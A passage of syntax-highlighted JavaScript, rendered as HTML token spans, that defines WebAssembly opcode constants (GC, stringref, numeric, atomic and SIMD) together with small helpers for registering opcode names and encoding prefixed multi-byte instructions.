        <span class="token literal-property property">RefNull</span><span class="token operator">:</span> <span class="token number">0xd0</span><span class="token punctuation">,</span>
        <span class="token literal-property property">RefIsNull</span><span class="token operator">:</span> <span class="token number">0xd1</span><span class="token punctuation">,</span>
        <span class="token literal-property property">RefFunc</span><span class="token operator">:</span> <span class="token number">0xd2</span><span class="token punctuation">,</span>
        <span class="token literal-property property">RefEq</span><span class="token operator">:</span> <span class="token number">0xd3</span><span class="token punctuation">,</span>
        <span class="token literal-property property">RefAsNonNull</span><span class="token operator">:</span> <span class="token number">0xd4</span><span class="token punctuation">,</span>
        <span class="token literal-property property">BrOnNull</span><span class="token operator">:</span> <span class="token number">0xd5</span><span class="token punctuation">,</span>
        <span class="token literal-property property">BrOnNonNull</span><span class="token operator">:</span> <span class="token number">0xd6</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
      <span class="token keyword">function</span> <span class="token function">defineWasmOpcode</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>globalThis<span class="token punctuation">.</span>kWasmOpcodeNames <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          globalThis<span class="token punctuation">.</span>kWasmOpcodeNames <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>globalThis<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">value</span><span class="token operator">:</span> value <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>globalThis<span class="token punctuation">.</span>kWasmOpcodeNames<span class="token punctuation">[</span>value<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
            <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Duplicate wasm opcode: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">. Previous name: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>globalThis<span class="token punctuation">.</span>kWasmOpcodeNames<span class="token punctuation">[</span>value<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, new name: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        globalThis<span class="token punctuation">.</span>kWasmOpcodeNames<span class="token punctuation">[</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> name<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> name <span class="token keyword">in</span> kWasmOpcodes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">defineWasmOpcode</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">kExpr</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> kWasmOpcodes<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token comment">// Prefix opcodes</span>
      <span class="token keyword">const</span> kPrefixOpcodes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token constant">GC</span><span class="token operator">:</span> <span class="token number">0xfb</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Numeric</span><span class="token operator">:</span> <span class="token number">0xfc</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Simd</span><span class="token operator">:</span> <span class="token number">0xfd</span><span class="token punctuation">,</span>
        <span class="token literal-property property">Atomic</span><span class="token operator">:</span> <span class="token number">0xfe</span><span class="token punctuation">,</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> prefix <span class="token keyword">in</span> kPrefixOpcodes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">defineWasmOpcode</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">k</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>prefix<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">Prefix</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> kPrefixOpcodes<span class="token punctuation">[</span>prefix<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token comment">// Use these for multi-byte instructions (opcode > 0x7F needing two LEB bytes):</span>
      <span class="token keyword">function</span> <span class="token function">SimdInstr</span><span class="token punctuation">(</span><span class="token parameter">opcode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>opcode <span class="token operator">&lt;=</span> <span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> opcode<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>kSimdPrefix<span class="token punctuation">,</span> <span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>opcode <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> opcode <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">GCInstr</span><span class="token punctuation">(</span><span class="token parameter">opcode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>opcode <span class="token operator">&lt;=</span> <span class="token number">0x7f</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">[</span>kGCPrefix<span class="token punctuation">,</span> opcode<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>kGCPrefix<span class="token punctuation">,</span> <span class="token number">0x80</span> <span class="token operator">|</span> <span class="token punctuation">(</span>opcode <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> opcode <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token comment">// GC opcodes</span>
      <span class="token keyword">let</span> kExprStructNew <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStructNewDefault <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStructGet <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStructGetS <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStructGetU <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStructSet <span class="token operator">=</span> <span class="token number">0x05</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayNew <span class="token operator">=</span> <span class="token number">0x06</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayNewDefault <span class="token operator">=</span> <span class="token number">0x07</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayNewFixed <span class="token operator">=</span> <span class="token number">0x08</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayNewData <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayNewElem <span class="token operator">=</span> <span class="token number">0x0a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayGet <span class="token operator">=</span> <span class="token number">0x0b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayGetS <span class="token operator">=</span> <span class="token number">0x0c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayGetU <span class="token operator">=</span> <span class="token number">0x0d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArraySet <span class="token operator">=</span> <span class="token number">0x0e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayLen <span class="token operator">=</span> <span class="token number">0x0f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayFill <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayCopy <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayInitData <span class="token operator">=</span> <span class="token number">0x12</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprArrayInitElem <span class="token operator">=</span> <span class="token number">0x13</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprRefTest <span class="token operator">=</span> <span class="token number">0x14</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprRefTestNull <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprRefCast <span class="token operator">=</span> <span class="token number">0x16</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprRefCastNull <span class="token operator">=</span> <span class="token number">0x17</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprBrOnCastGeneric <span class="token operator">=</span> <span class="token number">0x18</span><span class="token punctuation">;</span> <span class="token comment">// TODO(14034): Drop "Generic" name.</span>
      <span class="token keyword">let</span> kExprBrOnCastFailGeneric <span class="token operator">=</span> <span class="token number">0x19</span><span class="token punctuation">;</span> <span class="token comment">// TODO(14034): Drop "Generic" name.</span>
      <span class="token keyword">let</span> kExprAnyConvertExtern <span class="token operator">=</span> <span class="token number">0x1a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprExternConvertAny <span class="token operator">=</span> <span class="token number">0x1b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprRefI31 <span class="token operator">=</span> <span class="token number">0x1c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI31GetS <span class="token operator">=</span> <span class="token number">0x1d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI31GetU <span class="token operator">=</span> <span class="token number">0x1e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprRefCastNop <span class="token operator">=</span> <span class="token number">0x4c</span><span class="token punctuation">;</span>
      <span class="token comment">// Stringref proposal.</span>
      <span class="token keyword">let</span> kExprStringNewUtf8 <span class="token operator">=</span> <span class="token number">0x80</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringNewWtf16 <span class="token operator">=</span> <span class="token number">0x81</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringConst <span class="token operator">=</span> <span class="token number">0x82</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringMeasureUtf8 <span class="token operator">=</span> <span class="token number">0x83</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringMeasureWtf8 <span class="token operator">=</span> <span class="token number">0x84</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringMeasureWtf16 <span class="token operator">=</span> <span class="token number">0x85</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringEncodeUtf8 <span class="token operator">=</span> <span class="token number">0x86</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringEncodeWtf16 <span class="token operator">=</span> <span class="token number">0x87</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringConcat <span class="token operator">=</span> <span class="token number">0x88</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringEq <span class="token operator">=</span> <span class="token number">0x89</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringIsUsvSequence <span class="token operator">=</span> <span class="token number">0x8a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringNewLossyUtf8 <span class="token operator">=</span> <span class="token number">0x8b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringNewWtf8 <span class="token operator">=</span> <span class="token number">0x8c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringEncodeLossyUtf8 <span class="token operator">=</span> <span class="token number">0x8d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringEncodeWtf8 <span class="token operator">=</span> <span class="token number">0x8e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringNewUtf8Try <span class="token operator">=</span> <span class="token number">0x8f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringAsWtf8 <span class="token operator">=</span> <span class="token number">0x90</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewWtf8Advance <span class="token operator">=</span> <span class="token number">0x91</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewWtf8EncodeUtf8 <span class="token operator">=</span> <span class="token number">0x92</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewWtf8Slice <span class="token operator">=</span> <span class="token number">0x93</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewWtf8EncodeLossyUtf8 <span class="token operator">=</span> <span class="token number">0x94</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewWtf8EncodeWtf8 <span class="token operator">=</span> <span class="token number">0x95</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringAsWtf16 <span class="token operator">=</span> <span class="token number">0x98</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewWtf16Length <span class="token operator">=</span> <span class="token number">0x99</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewWtf16GetCodeunit <span class="token operator">=</span> <span class="token number">0x9a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewWtf16Encode <span class="token operator">=</span> <span class="token number">0x9b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewWtf16Slice <span class="token operator">=</span> <span class="token number">0x9c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringAsIter <span class="token operator">=</span> <span class="token number">0xa0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewIterNext <span class="token operator">=</span> <span class="token number">0xa1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewIterAdvance <span class="token operator">=</span> <span class="token number">0xa2</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewIterRewind <span class="token operator">=</span> <span class="token number">0xa3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringViewIterSlice <span class="token operator">=</span> <span class="token number">0xa4</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringCompare <span class="token operator">=</span> <span class="token number">0xa8</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringFromCodePoint <span class="token operator">=</span> <span class="token number">0xa9</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringHash <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringNewUtf8Array <span class="token operator">=</span> <span class="token number">0xb0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringNewWtf16Array <span class="token operator">=</span> <span class="token number">0xb1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringEncodeUtf8Array <span class="token operator">=</span> <span class="token number">0xb2</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringEncodeWtf16Array <span class="token operator">=</span> <span class="token number">0xb3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringNewLossyUtf8Array <span class="token operator">=</span> <span class="token number">0xb4</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringNewWtf8Array <span class="token operator">=</span> <span class="token number">0xb5</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringEncodeLossyUtf8Array <span class="token operator">=</span> <span class="token number">0xb6</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringEncodeWtf8Array <span class="token operator">=</span> <span class="token number">0xb7</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprStringNewUtf8ArrayTry <span class="token operator">=</span> <span class="token number">0xb8</span><span class="token punctuation">;</span>
      <span class="token comment">// Numeric opcodes.</span>
      <span class="token keyword">let</span> kExprI32SConvertSatF32 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32UConvertSatF32 <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32SConvertSatF64 <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32UConvertSatF64 <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64SConvertSatF32 <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64UConvertSatF32 <span class="token operator">=</span> <span class="token number">0x05</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64SConvertSatF64 <span class="token operator">=</span> <span class="token number">0x06</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64UConvertSatF64 <span class="token operator">=</span> <span class="token number">0x07</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprMemoryInit <span class="token operator">=</span> <span class="token number">0x08</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprDataDrop <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprMemoryCopy <span class="token operator">=</span> <span class="token number">0x0a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprMemoryFill <span class="token operator">=</span> <span class="token number">0x0b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprTableInit <span class="token operator">=</span> <span class="token number">0x0c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprElemDrop <span class="token operator">=</span> <span class="token number">0x0d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprTableCopy <span class="token operator">=</span> <span class="token number">0x0e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprTableGrow <span class="token operator">=</span> <span class="token number">0x0f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprTableSize <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprTableFill <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>
      <span class="token comment">// Atomic opcodes.</span>
      <span class="token keyword">let</span> kExprAtomicNotify <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicWait <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicWait <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicLoad <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicLoad8U <span class="token operator">=</span> <span class="token number">0x12</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicLoad16U <span class="token operator">=</span> <span class="token number">0x13</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicStore <span class="token operator">=</span> <span class="token number">0x17</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicStore8U <span class="token operator">=</span> <span class="token number">0x19</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicStore16U <span class="token operator">=</span> <span class="token number">0x1a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicAdd <span class="token operator">=</span> <span class="token number">0x1e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicAdd8U <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicAdd16U <span class="token operator">=</span> <span class="token number">0x21</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicSub <span class="token operator">=</span> <span class="token number">0x25</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicSub8U <span class="token operator">=</span> <span class="token number">0x27</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicSub16U <span class="token operator">=</span> <span class="token number">0x28</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicAnd <span class="token operator">=</span> <span class="token number">0x2c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicAnd8U <span class="token operator">=</span> <span class="token number">0x2e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicAnd16U <span class="token operator">=</span> <span class="token number">0x2f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicOr <span class="token operator">=</span> <span class="token number">0x33</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicOr8U <span class="token operator">=</span> <span class="token number">0x35</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicOr16U <span class="token operator">=</span> <span class="token number">0x36</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicXor <span class="token operator">=</span> <span class="token number">0x3a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicXor8U <span class="token operator">=</span> <span class="token number">0x3c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicXor16U <span class="token operator">=</span> <span class="token number">0x3d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicExchange <span class="token operator">=</span> <span class="token number">0x41</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicExchange8U <span class="token operator">=</span> <span class="token number">0x43</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicExchange16U <span class="token operator">=</span> <span class="token number">0x44</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicCompareExchange <span class="token operator">=</span> <span class="token number">0x48</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicCompareExchange8U <span class="token operator">=</span> <span class="token number">0x4a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32AtomicCompareExchange16U <span class="token operator">=</span> <span class="token number">0x4b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicLoad <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicLoad8U <span class="token operator">=</span> <span class="token number">0x14</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicLoad16U <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicLoad32U <span class="token operator">=</span> <span class="token number">0x16</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicStore <span class="token operator">=</span> <span class="token number">0x18</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicStore8U <span class="token operator">=</span> <span class="token number">0x1b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicStore16U <span class="token operator">=</span> <span class="token number">0x1c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicStore32U <span class="token operator">=</span> <span class="token number">0x1d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicAdd <span class="token operator">=</span> <span class="token number">0x1f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicAdd8U <span class="token operator">=</span> <span class="token number">0x22</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicAdd16U <span class="token operator">=</span> <span class="token number">0x23</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicAdd32U <span class="token operator">=</span> <span class="token number">0x24</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicSub <span class="token operator">=</span> <span class="token number">0x26</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicSub8U <span class="token operator">=</span> <span class="token number">0x29</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicSub16U <span class="token operator">=</span> <span class="token number">0x2a</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicSub32U <span class="token operator">=</span> <span class="token number">0x2b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicAnd <span class="token operator">=</span> <span class="token number">0x2d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicAnd8U <span class="token operator">=</span> <span class="token number">0x30</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicAnd16U <span class="token operator">=</span> <span class="token number">0x31</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicAnd32U <span class="token operator">=</span> <span class="token number">0x32</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicOr <span class="token operator">=</span> <span class="token number">0x34</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicOr8U <span class="token operator">=</span> <span class="token number">0x37</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicOr16U <span class="token operator">=</span> <span class="token number">0x38</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicOr32U <span class="token operator">=</span> <span class="token number">0x39</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicXor <span class="token operator">=</span> <span class="token number">0x3b</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicXor8U <span class="token operator">=</span> <span class="token number">0x3e</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicXor16U <span class="token operator">=</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicXor32U <span class="token operator">=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicExchange <span class="token operator">=</span> <span class="token number">0x42</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicExchange8U <span class="token operator">=</span> <span class="token number">0x45</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicExchange16U <span class="token operator">=</span> <span class="token number">0x46</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicExchange32U <span class="token operator">=</span> <span class="token number">0x47</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicCompareExchange <span class="token operator">=</span> <span class="token number">0x49</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicCompareExchange8U <span class="token operator">=</span> <span class="token number">0x4c</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicCompareExchange16U <span class="token operator">=</span> <span class="token number">0x4d</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64AtomicCompareExchange32U <span class="token operator">=</span> <span class="token number">0x4e</span><span class="token punctuation">;</span>
      <span class="token comment">// Simd opcodes.</span>
      <span class="token keyword">let</span> kExprS128LoadMem <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load8x8S <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load8x8U <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load16x4S <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load16x4U <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load32x2S <span class="token operator">=</span> <span class="token number">0x05</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load32x2U <span class="token operator">=</span> <span class="token number">0x06</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load8Splat <span class="token operator">=</span> <span class="token number">0x07</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load16Splat <span class="token operator">=</span> <span class="token number">0x08</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprS128Load32Splat <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>
